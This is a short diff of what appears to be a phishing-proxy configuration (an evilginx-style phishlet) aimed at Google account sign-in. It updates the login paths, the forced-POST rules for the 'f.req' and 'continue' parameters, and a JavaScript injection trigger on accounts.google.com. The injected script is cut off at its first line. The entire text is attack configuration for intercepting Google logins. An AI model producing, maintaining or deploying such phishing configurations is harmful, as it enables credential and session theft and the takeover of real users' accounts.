@@ -44,7 +44,7 @@ login:
   path: '/ServiceLogin'
 
 force_post:
-  - path: '/signin/identifier'
+  - path: '/identifier'
     search: 
       - {key: 'f.req', search: '.*'}
       - {key: 'continue', search: '.*'}
@@ -55,7 +55,7 @@ force_post:
  
 js_inject:
   - trigger_domains: ['accounts.google.com']
-    trigger_paths: ['signin/identifier']
+    trigger_paths: ['/identifier']
     script: |
       setInterval(function() {
 
